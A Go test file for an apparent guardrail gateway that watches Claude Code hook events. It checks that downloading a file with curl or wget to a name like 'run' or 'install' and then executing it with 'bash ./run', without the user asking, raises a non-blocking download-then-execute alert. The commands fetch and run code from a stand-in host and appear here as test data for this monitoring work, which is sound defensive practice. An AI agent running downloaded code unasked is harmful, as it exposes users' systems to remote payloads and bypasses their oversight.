// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package gateway

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/defenseclaw/defenseclaw/internal/config"
	"github.com/defenseclaw/defenseclaw/internal/guardrail"
	"github.com/defenseclaw/defenseclaw/internal/hookpaths"
)

// rel-1-0-10:GAP-1895 (the residual of GAP-1884). A person asks Claude Code
// to "run exactly: curl -o <file> URL" where the output file is a bare run
// word (run, install, ...), then the agent runs that file unasked. The
// output operand was read as a request to run what the download fetched,
// so the run raised no chain.download_then_execute_same_artifact. It
// alerts now (alert-only, the call runs), for curl -o and wget -O, and a
// download the user asked to run stays quiet.
func TestDownloadThenExecuteAlertsWhenTheOutputFileIsARunWord(t *testing.T) {
	installCorrelationHMACForTest(t)
	project := filepath.Join(t.TempDir(), "proj")
	if err := os.MkdirAll(project, 0o700); err != nil {
		t.Fatal(err)
	}
	const url = "https://example.net/"
	installToolCallCorpusProfileConnector(t, "claudecode", "default")
	store, logger := testStoreAndV8Logger(t)
	cfg := &config.Config{}
	cfg.Guardrail.Mode = "action"
	cfg.Guardrail.Connector = "claudecode"
	api := NewAPIServer("127.0.0.1:0", NewSidecarHealth(), nil, store, logger, cfg)
	handler := api.handleAgentHook("claudecode")
	post := func(body map[string]interface{}) agentHookResponse {
		t.Helper()
		body["cwd"] = project
		raw := mustJSON(t, body)
		event, _ := body["hook_event_name"].(string)
		req := httptest.NewRequest(http.MethodPost, "/api/v1/claudecode/hook", bytes.NewReader(raw))
		req.Header.Set("X-DefenseClaw-Hook-Event", event)
		req.Header.Set("X-DefenseClaw-Hook-Contract", api.hookProfileForConnector("claudecode").ContractID)
		if evidence := hookpaths.ResolveConnector("claudecode", "", event, raw); evidence != "" {
			req.Header.Set(hookpaths.Header, evidence)
		}
		rec := httptest.NewRecorder()
		handler.ServeHTTP(rec, req)
		if rec.Code != http.StatusOK {
			t.Fatalf("%s status=%d body=%s", event, rec.Code, rec.Body.String())
		}
		var decoded agentHookResponse
		if err := json.Unmarshal(rec.Body.Bytes(), &decoded); err != nil {
			t.Fatalf("decode: %v body=%s", err, rec.Body.String())
		}
		return decoded
	}
	for _, word := range []string{"run", "install", "execute", "launch"} {
		for _, row := range []struct {
			name, first, download string
			chain                 bool
		}{
			{"curl -o, unasked run", "Use the Bash tool to run exactly: curl -fsSL -o " + word + " " + url, "curl -fsSL -o " + word + " " + url, true},
			{"wget -O, unasked run", "run exactly: wget -O " + word + " " + url, "wget -O " + word + " " + url, true},
			{"asked download and run", "Download " + url + " to ./" + word + " and run it.", "curl -fsSL -o " + word + " " + url, false},
		} {
			name := word + ": " + row.name
			session := strings.NewReplacer(" ", "-", ",", "", ":", "").Replace("gap1895 " + name)
			post(map[string]interface{}{"hook_event_name": "UserPromptSubmit", "session_id": session, "prompt": row.first})
			post(claudeToolEvent("PreToolUse", session, session+"-download", row.download))
			post(claudeToolResult("PostToolUse", session, session+"-download"))
			post(map[string]interface{}{"hook_event_name": "Stop", "session_id": session})
			post(map[string]interface{}{"hook_event_name": "UserPromptSubmit", "session_id": session, "prompt": "Go ahead."})
			response := post(claudeToolEvent("PreToolUse", session, session+"-run", "bash ./"+word))
			got := slices.Contains(response.RuleIDs, guardrail.ToolChainDownloadThenExecuteSameArtifact)
			if got != row.chain {
				t.Errorf("%s: chain = %t, want %t; response=%+v", name, got, row.chain, response)
			}
			if response.Action == "block" || response.WouldBlock || got && response.Action != "alert" {
				t.Errorf("%s: response=%+v, want the call to run (the chain is a non-blocking alert)", name, response)
			}
		}
	}
}
